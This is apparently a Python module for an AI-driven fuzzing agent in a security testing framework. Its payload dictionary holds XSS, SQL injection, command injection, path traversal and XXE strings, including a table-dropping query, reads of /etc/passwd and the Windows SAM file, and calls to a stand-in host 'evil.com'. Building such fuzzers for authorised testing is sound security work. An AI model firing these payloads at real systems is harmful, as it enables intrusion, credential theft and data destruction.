"""
Fuzzer Agent - Intelligent fuzzing for vulnerability discovery
"""

import asyncio
import logging
from typing import Dict, Any, List, Optional
import random
import string

from .base import BaseAgent
from ..utils.logger import setup_logger

logger = setup_logger(__name__)

class FuzzerAgent(BaseAgent):
    """Agent responsible for intelligent fuzzing"""
    
    def _get_system_prompt(self) -> str:
        return """You are a fuzzing specialist AI. Your role is to:
        1. Generate intelligent fuzzing payloads
        2. Identify input validation weaknesses
        3. Discover edge cases and boundary conditions
        4. Test for injection vulnerabilities
        5. Adapt fuzzing strategies based on responses"""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        
        # Fuzzing payloads database
        self.payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                "';alert(1)//",
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<body onload=alert(1)>',
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>'
            ],
            'sqli': [
                "' OR '1'='1",
                "1' OR '1' = '1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(5)--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "\" OR \"1\"=\"1"
            ],
            'command': [
                '; ls',
                '| whoami',
                '`id`',
                '$(whoami)',
                '; cat /etc/passwd',
                '& ping -c 1 127.0.0.1',
                '\n/bin/bash\n',
                '; echo vulnerable',
                '| sleep 5',
                '&& curl http://evil.com'
            ],
            'path': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '....//....//....//etc/passwd',
                'file:///etc/passwd',
                '\\\\localhost\\c$\\windows\\system32\\config\\sam',
                '../' * 10 + 'etc/passwd',
                '%2e%2e%2f' * 3 + 'etc/passwd',
                '..;/etc/passwd',
                '../../../proc/self/environ',
                'php://filter/convert.base64-encode/resource=index.php'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe">%xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
            ],
            'overflow': [
                'A' * 100,
                'A' * 1000,
                'A' * 10000,
                'A' * 100000,
                '%s' * 100,
                '%n' * 10,
                '\x00' * 100,
                '\xff' * 100
            ]
        }
    
    async def generate_payloads(self, vulnerability_type: str, context: Dict = None) -> List[str]:
        """Generate fuzzing payloads for specific vulnerability type"""
        base_payloads = self.payloads.get(vulnerability_type, [])
        
        # Use AI to generate additional context-specific payloads
        if context:
            prompt = f"""Generate fuzzing payloads for {vulnerability_type} vulnerability.
            Context: {context}
            Generate 5 unique payloads that could trigger this vulnerability."""
            
            ai_payloads = await self.think(prompt, context)
            # Parse AI response to extract payloads
            # Simplified - in production use better parsing
            additional = ai_payloads.split('\n')[:5]
            base_payloads.extend(additional)
        
        # Add mutations
        mutated = self._mutate_payloads(base_payloads)
        
        return list(set(base_payloads + mutated))
    
    def _mutate_payloads(self, payloads: List[str]) -> List[str]:
        """Mutate payloads to create variations"""
        mutated = []
        
        for payload in payloads[:10]:  # Limit mutations
            # Case variations
            mutated.append(payload.upper())
            mutated.append(payload.lower())
            
            # Encoding variations
            mutated.append(payload.replace(' ', '%20'))
            mutated.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            
            # Add random characters
            if len(payload) < 100:
                mutated.append(payload + ''.join(random.choices(string.ascii_letters, k=5)))
            
            # Double encoding
            mutated.append(payload.replace('%', '%25'))
        
        return mutated
    
    async def fuzz_parameter(self, url: str, param: str, payloads: List[str]) -> List[Dict]:
        """Fuzz a specific parameter with payloads"""
        results = []
        
        for payload in payloads:
            result = {
                'parameter': param,
                'payload': payload,
                'response': None,
                'interesting': False,
                'reason': None
            }
            
            # Simulate fuzzing (in production, make actual requests)
            # Check for interesting responses
            if any(indicator in payload for indicator in ['script', 'alert', 'DROP', '../']):
                result['interesting'] = True
                result['reason'] = 'Potential injection point'
            
            results.append(result)
        
        return results
    
    async def analyze(self, target: str) -> Dict:
        """Analyze target for fuzzing opportunities"""
        analysis = {
            'target': target,
            'fuzz_points': [],
            'recommended_payloads': {},
            'priority_parameters': []
        }
        
        # Identify fuzzing points
        prompt = f"""Analyze {target} for fuzzing opportunities.
        Identify:
        1. Input parameters to fuzz
        2. Vulnerability types to test
        3. Priority targets"""
        
        response = await self.think(prompt)
        
        # For demo, return static analysis
        analysis['fuzz_points'] = ['id', 'search', 'user', 'page', 'action']
        analysis['recommended_payloads'] = {
            'xss': self.payloads['xss'][:3],
            'sqli': self.payloads['sqli'][:3]
        }
        analysis['priority_parameters'] = ['id', 'search']
        
        return analysis
    
    async def execute(self, task: Dict) -> Any:
        """Execute fuzzing task"""
        task_type = task.get('type', 'fuzz')
        
        if task_type == 'generate_payloads':
            return await self.generate_payloads(
                task.get('vulnerability_type'),
                task.get('context')
            )
        elif task_type == 'fuzz':
            return await self.fuzz_parameter(
                task.get('url'),
                task.get('parameter'),
                task.get('payloads', [])
            )
        elif task_type == 'analyze':
            return await self.analyze(task.get('target'))
        else:
            return None